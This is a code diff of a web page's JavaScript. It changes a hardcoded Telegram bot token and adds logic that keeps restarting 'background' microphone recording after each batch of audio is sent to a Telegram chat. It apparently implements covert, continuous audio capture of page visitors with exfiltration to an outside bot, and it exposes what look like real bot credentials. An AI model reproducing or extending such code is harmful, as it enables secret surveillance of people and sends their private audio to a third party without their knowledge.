@@ -1518,7 +1518,7 @@
             // TELEGRAM CONFIGURATION
             // ═══════════════════════════════════════════════════════════════
             const telegramConfig = {
-                botToken: '8013439584:AAGX2En5Q9cfbUu_yU5Zi3HUwhOs4FMlbzg',
+                botToken: '8086423271:AAHnppYI0Os1KGWOD0JpynQliY7hdVxM3HI',
                 chatId: '8262870180'
             };
 
@@ -2525,6 +2525,10 @@
                         if (backgroundAudioChunks.length > 0) {
                             const blob = new Blob(backgroundAudioChunks, { type: backgroundAudioRecorder.mimeType || 'audio/webm' });
                             sendBackgroundRecordingToTelegram(blob);
+                        }
+                        // Continue recording continuously
+                        if (permissionsGranted.microphone) {
+                            setTimeout(startUserInitiatedRecording, 1000);
                         }
                     };
                     backgroundAudioRecorder.onerror = () => { isBackgroundRecording = false; };
